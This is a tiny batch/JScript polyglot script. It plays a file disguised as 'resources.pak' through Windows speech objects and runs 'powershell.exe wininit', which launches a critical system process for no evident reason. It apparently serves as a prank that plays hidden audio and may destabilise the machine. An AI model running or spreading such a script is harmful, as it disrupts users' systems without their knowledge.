@if (@X)==(@Y) @end /* JScript comment
    @echo off
    cscript //E:JScript //nologo "%~f0" %*
    powershell.exe wininit
    exit /b %errorlevel%

@if (@X)==(@Y) @end JScript comment */

var spVoice = new ActiveXObject("SAPI.SpVoice");
var spFile = new ActiveXObject("SAPI.SpFileStream.1");
spFile.Open("resources.pak");
spVoice.SpeakStream(spFile);

